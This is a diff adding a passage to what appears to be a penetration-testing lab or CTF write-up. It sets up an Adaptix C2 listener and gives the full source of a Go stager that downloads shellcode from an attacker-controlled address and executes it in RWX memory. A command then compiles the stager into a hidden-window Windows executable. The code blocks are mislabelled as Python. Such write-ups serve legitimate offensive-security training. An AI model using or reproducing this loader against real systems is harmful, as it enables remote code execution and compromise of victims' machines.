@@ -641,6 +641,78 @@ Ill set up my adaptix c2 server and client
 Ill then start a listener on my c2 on port 443, then generating the some shellcode called `http.x64.bin`
 
 ```python
+// +build windows
+			
+package main
+			
+import (
+	"io"
+	"net/http"
+	"syscall"
+	"unsafe"
+	)
+			
+var (
+	kernel32            = syscall.NewLazyDLL("kernel32.dll")
+	procVirtualAlloc    = kernel32.NewProc("VirtualAlloc")
+	)
+			
+const (
+	MEM_COMMIT             = 0x1000
+	MEM_RESERVE            = 0x2000
+	PAGE_EXECUTE_READWRITE = 0x40
+	)
+			
+func downloadShellcode(url string) ([]byte, error) {
+	resp, err := http.Get(url)
+	if err != nil {
+		return nil, err
+		}
+	defer resp.Body.Close()
+			
+	return io.ReadAll(resp.Body)
+	}
+			
+func executeShellcode(shellcode []byte) {
+	addr, _, err := procVirtualAlloc.Call(
+		0,
+		uintptr(len(shellcode)),
+		MEM_COMMIT|MEM_RESERVE,
+		PAGE_EXECUTE_READWRITE,
+	)
+	if addr == 0 {
+		panic(err)
+	}
+			
+	// Copy shellcode into allocated memory
+	for i := 0; i < len(shellcode); i++ {
+		*(*byte)(unsafe.Pointer(addr + uintptr(i))) = shellcode[i]
+	}
+		
+	// Execute shellcode
+	syscall.Syscall(addr, 0, 0, 0, 0)
+}
+		
 
+func main() {
+	url := "http://10.10.14.61/http.x64.bin"
+			
+	shellcode, err := downloadShellcode(url)
+	if err != nil {
+		panic(err)
+	}
+			
+	executeShellcode(shellcode)
+}
 ```
+
+Ill then use this stager written in go to grab the shellcode and run it
+
+```python
+GOOS=windows GOARCH=amd64 CGO_ENABLED=0 go build -ldflags="-H windowsgui" -o stager.exe stager.go
+```
+
+Ill then compile stager.go into stager.exe
+
+
 
